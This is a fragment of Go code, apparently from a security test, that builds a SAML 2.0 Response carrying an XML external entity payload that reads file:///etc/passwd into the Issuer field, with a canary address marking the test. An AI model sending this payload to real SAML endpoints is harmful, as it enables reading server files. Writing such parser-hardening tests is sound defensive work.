	return fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="%s"
    Version="2.0"
    IssueInstant="%s"
    Destination="%s">
  <saml:Issuer>&xxe;</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion
      xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
      ID="%s"
      Version="2.0"
      IssueInstant="%s">
    <saml:Issuer>%s</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">xxe-canary@example.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="%s" NotOnOrAfter="%s">
      <saml:AudienceRestriction>
        <saml:Audience>%s</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
  </saml:Assertion>
</samlp:Response>`,
		responseID, issueInstant, recipient,
		assertionID, issueInstant,
		entityID,
		issueInstant, notOnOrAfter,
		entityID,
	)
}
